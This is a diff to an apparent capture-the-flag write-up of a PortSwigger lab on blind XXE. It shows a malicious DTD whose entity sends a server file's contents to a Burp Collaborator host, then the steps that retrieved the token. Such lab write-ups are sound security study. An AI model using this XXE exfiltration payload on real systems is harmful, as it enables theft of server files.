@@ -141,7 +141,13 @@ Challenge's description: Exploiting blind XXE to exfiltrate data with malicious 
        <!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM '<burp collaborator link>/?x=%file;'>">
        %eval;
        %exfiltrate;
-- In burp repeater,I sent an xml request to induce the server to load the dtd file hosted on Portswigger exploit server
+- In burp repeater,I sent an xml request to induce the server to load the url hosted on Portswigger exploit server containing our malicious DTD file
   ![2023-10-21_16-22](https://github.com/SENSEIXENUS2/SENSEIXENUS2.github.io/assets/98669513/c144d8e1-762c-465f-b57b-0e29e0090fe4)
 
--
+- Then,I received this token through burp collaborator server.
+
+![2023-10-21_16-42](https://github.com/SENSEIXENUS2/SENSEIXENUS2.github.io/assets/98669513/1865f097-e388-44b8-b035-116b77e3406c)
+
+- I submitted the token and solved the challenge.
+
+![2023-10-21_17-00](https://github.com/SENSEIXENUS2/SENSEIXENUS2.github.io/assets/98669513/bedca5f4-4116-4f43-926e-ec874ca7cd9b)
